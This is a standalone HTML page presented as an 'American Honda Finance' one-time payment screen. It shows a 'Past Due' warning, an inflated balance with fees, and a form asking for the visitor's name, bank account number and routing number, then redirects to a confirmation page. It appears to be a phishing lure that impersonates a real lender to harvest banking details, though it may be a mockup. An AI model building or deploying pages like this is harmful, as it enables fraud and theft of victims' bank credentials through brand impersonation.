<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>American Honda Finance - One-Time Payment</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f9;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        label {
            display: block;
            margin: 15px 0 5px;
            font-weight: bold;
        }
        input, select, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .details {
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: none; /* Initially hidden */
        }
        .details p {
            margin: 5px 0;
        }
        .show-details {
            color: red;
            cursor: pointer;
            font-weight: bold;
            text-decoration: underline;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Make a Payment</h1>
        <div style="background-color: #fdf6e3; border: 1px solid #8b4513; padding: 10px; border-radius: 5px; font-family: Arial, sans-serif;">
            <p style="margin: 0; font-size: 16px; color: #8b4513;">
                <span style="font-weight: bold; color: #8b4513;">&#9888;</span>
                Your account is <strong>Past Due</strong>. 
                <a href="#" style="color: #8b4513; text-decoration: underline;">Please make a payment.</a>
            </p>
        </div>
        <div>
            <p>
                <strong>AMOUNT DUE:</strong> $2,705.80
                <span class="show-details" onclick="toggleDetails()">Show Details</span>
            </p>
        </div>
        <div class="details" id="amountDetails">
            <h3>Amount Due Details</h3>
            <p><strong>AMOUNT DUE:</strong> $2,705.80</p>
            <p><strong>DUE DATE:</strong> Dec 6, 2025</p>
            <p><strong>TOTAL AMOUNT DUE:</strong> $2,705.80</p>
            <p><strong>Monthly Amount Due (Dec 6, 2025):</strong> $467.33</p>
            <p><strong>Total Fees Due:</strong> $369.15</p>
            <p><strong>REMAINING AMOUNT DUE:</strong> $2,705.80</p>
        </div>
        <form id="paymentForm" action="confirmation.html" method="get">
            <label for="name">Full Name</label>
            <input type="text" id="name" name="name" required>
            
            <label for="account">Account Number</label>
            <input type="text" id="account" name="account" required>
            
            <label for="routing">Routing Number</label>
            <input type="text" id="routing" name="routing" required>
            
            <label for="amount">Payment Amount ($)</label>
            <input type="number" id="amount" name="amount" value="2705.80" step="0.01" required>
            
            <label for="method">Payment Method</label>
            <select id="method" name="method" required>
                <option value="bank_transfer">Bank Transfer</option>
            </select>
            
            <label for="bank_name">Bank Name</label>
            <input type="text" id="bank_name" name="bank_name" value="US Bank" required>
            
            <button type="submit">Submit Payment</button>
        </form>
    </div>
    <script>
        function toggleDetails() {
            const details = document.getElementById('amountDetails');
            details.style.display = details.style.display === 'none' || details.style.display === '' ? 'block' : 'none';
        }

        document.getElementById('paymentForm').addEventListener('submit', (event) => {
            alert("You will be redirected in 8 seconds.");
            setTimeout(() => {
                window.location.href = 'confirmation.html';
            }, 8000);
        });
    </script>
</body>
</html>
